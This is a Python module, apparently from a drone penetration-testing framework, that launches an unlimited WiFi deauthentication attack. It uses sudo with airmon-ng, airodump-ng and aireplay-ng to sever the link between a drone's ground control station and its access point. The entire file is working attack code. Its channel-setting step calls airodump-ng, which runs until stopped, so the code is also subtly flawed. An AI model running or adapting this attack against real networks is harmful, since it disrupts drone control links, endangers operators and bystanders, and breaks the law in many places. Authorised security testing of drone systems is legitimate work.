# Filename: modules/wifi_deauth_attack.py

from core.base import BaseModule
import subprocess

class WifiDeauthAttackModule(BaseModule):
    def __init__(self):
        super().__init__(
            name="Wifi Deauth Attack",
            description="Disrupts communication between GCS and drone by performing a deauthentication attack on the WiFi network.",
            category="Network"
        )
        self.options = {
            "interface": {"value": "wlan0mon", "description": "The network interface in monitor mode.", "required": True},
            "ap_mac": {"value": "", "description": "The MAC address of the Access Point (AP).", "required": True},
            "gcs_mac": {"value": "", "description": "The MAC address of the Ground Control Station (GCS).", "required": True},
            "channel": {"value": "6", "description": "The WiFi channel to monitor.", "required": True}
        }

    def execute(self):
        interface = self.get_option("interface")
        ap_mac = self.get_option("ap_mac")
        gcs_mac = self.get_option("gcs_mac")
        channel = self.get_option("channel")

        if not ap_mac or not gcs_mac:
            print("[!] AP MAC and GCS MAC addresses are required.")
            return

        try:
            print(f"[*] Enabling monitor mode on {interface}...")
            subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)

            print(f"[*] Setting WiFi channel to {channel}...")
            subprocess.run(["sudo", "airodump-ng", interface, "-c", channel], check=True)

            print(f"[*] Executing deauth attack on GCS MAC {gcs_mac} and AP MAC {ap_mac}...")
            subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", ap_mac, "-c", gcs_mac, interface], check=True)

            print("[+] Deauth attack executed successfully.")
        except subprocess.CalledProcessError as e:
            print(f"[!] Error executing attack: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")


